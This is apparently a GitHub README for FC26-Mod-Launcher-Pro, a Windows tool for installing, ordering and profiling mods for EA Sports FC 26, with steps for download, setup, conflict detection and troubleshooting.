FC26-Mod-Launcher-Pro helps you install, organize, and run mods for EA Sports FC 26 on your Windows computer. This tool manages your files so you can focus on your game. It checks for conflicts between mods and allows you to create profiles to switch between setups instantly.

## ⚙️ System Requirements

- Windows 10 or Windows 11 (64-bit)
- EA Sports FC 26 installed via EA App or Steam
- At least 500MB of free disk space
- Microsoft .NET Desktop Runtime 8.0 or newer

## 📥 How to Download and Install

Follow these steps to set up the launcher on your PC.

1. Visit the [official download page](https://github.com/chavezhe8320/FC26-Mod-Launcher-Pro) to get the latest version.
2. Look for the "Releases" section on the right side of the page.
3. Click the link for the file ending in `.zip` under the latest release.
4. Save the file to your "Downloads" folder.
5. Open your "Downloads" folder and find the file you saved.
6. Right-click the file and select "Extract All" to create a new folder.
7. Open the folder and double-click `FC26-Mod-Launcher.exe` to start the program.

## 🎮 Setting Up Your Game Path

The launcher needs to find your game installation folder to work. 

1. Open the launcher after you run the file.
2. Click the "Settings" tab at the top.
3. Click "Browse" next to the "Game Path" box.
4. Locate the folder where you installed EA Sports FC 26. This is usually under `C:\Program Files\EA Games\EA SPORTS FC 26`.
5. Click "Select Folder" and then click "Save".

## 📦 Adding and Managing Mods

You can add mods by placing the files into the launcher.

1. Click the "Imports" tab.
2. Drag and drop your mod files into the window, or click "Add Mods" to search your computer.
3. The launcher scans the files to ensure they work with your version of the game.
4. Check the box next to each mod to enable it.
5. Use the "Move Up" or "Move Down" buttons to set the load order. This determines which mod takes priority if two mods change the same file.

## 🛠️ Using Profiles

Profiles allow you to save different mod combinations. You might have one profile for career mode mods and another for visual mods.

1. Click the "Profiles" menu on the left.
2. Click "Create New Profile" and type a name.
3. Enable your desired mods for that specific profile.
4. Select the profile from the list before you click "Launch Game".

## 🛡️ Conflict Detection

When you enable multiple mods, the launcher checks the files in the background. If two mods attempt to change the same game data, the launcher alerts you with a warning.

1. Look for the red exclamation mark icon next to a mod name.
2. Click the icon to open the conflict window.
3. The window displays exactly which files overlap.
4. Disable one of the conflicting mods or change the load order to solve the issue.

## 🚀 Launching the Game

Once you organize your mods, follow these steps to play.

1. Select your preferred profile.
2. Click the large "Launch Game" button in the bottom right corner.
3. The launcher prepares the files and opens the EA App or Steam to start your game.
4. Wait for the game to reach the main menu. Your mods are now active.

## 💡 Troubleshooting Common Issues

- **Game does not start:** Verify that the "Game Path" in settings points to the correct folder. Ensure you have the latest version of the .NET Runtime installed.
- **Mods do not appear:** Check if the mods are enabled in the active profile. Ensure the load order is correct.
- **Launcher crashes:** Close the game, restart the launcher, and clear the cache in the "Settings" menu.
